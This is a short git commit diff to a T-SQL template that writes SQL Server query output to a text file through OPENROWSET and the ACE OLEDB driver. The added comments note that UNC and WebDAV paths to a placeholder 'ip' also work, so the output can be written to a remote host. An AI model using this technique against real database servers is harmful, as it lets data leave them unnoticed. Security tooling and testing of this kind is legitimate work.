ed075dfbf421b62f63ad17470ee0d4044feccd5e
Scott Sutherland <nullbind@users.noreply.github.com>
2017-09-06 16:27:06 -0500

    Update write_file_OpenRowSetTxt.sql

--- templates/tsql/write_file_OpenRowSetTxt.sql
+++ templates/tsql/write_file_OpenRowSetTxt.sql
@@ -17,3 +17,5 @@ go
 INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0','Text;Database=c:\temp\;HDR=Yes;FORMAT=text', 'SELECT * FROM [file.txt]')
 SELECT @@version
 
+-- Note: This also works with unc paths \\ip\file.txt
+-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.
